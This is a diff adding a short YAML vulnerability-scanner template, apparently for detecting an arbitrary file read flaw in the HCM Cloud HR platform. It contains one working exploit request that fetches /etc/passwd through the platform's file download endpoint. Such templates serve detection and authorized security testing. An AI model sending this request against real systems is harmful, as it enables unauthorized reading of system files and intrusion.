@@ -1,0 +1,16 @@
+id: hcm-cloud-lfi
+brief:
+    title: HCM Cloud - Arbitrary File Read
+    by: s4e-io
+    level: high
+    about: HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.
+    label:
+        - hcm-cloud
+        - lfi
+        - hcm
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/model_report/file/download?index=/&ext=/etc/passwd'
+      signs: []
